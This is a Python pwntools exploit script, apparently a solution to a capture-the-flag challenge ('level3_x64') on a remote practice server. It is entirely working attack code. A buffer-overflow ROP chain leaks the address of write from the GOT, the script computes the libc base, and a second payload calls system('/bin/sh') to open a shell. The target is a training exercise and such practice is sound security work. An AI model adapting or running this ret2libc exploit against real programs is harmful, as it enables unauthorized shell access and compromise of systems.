from pwn import *

elf = ELF('./level3_x64')

local = 0
if local == 1:
    io = process('./level3_x64')
    #gdb.attach(io,'b * 0x000000000400618')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    io = remote('node4.buuoj.cn',27636)
    libc = ELF('libc-2.23-0ubuntu11.so')

ret = 0x0000000000400499
pop_rdi_ret = 0x00000000004006b3
pop_rsi_r15_ret = 0x00000000004006b1
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = 0x40061A

payload = 'a'*0x80+p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0)+p64(write_plt)+p64(main_addr)
io.recvuntil("Input:\n")
io.sendline(payload)

write_addr = u64(io.recv(8))
print(hex(write_addr))
io.recvuntil("put:\n")
libc_base = write_addr - libc.symbols['write']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + libc.search('/bin/sh').next()
payload2 = 'a'*0x80+p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)+p64(main_addr)
io.sendline(payload2)

io.interactive()
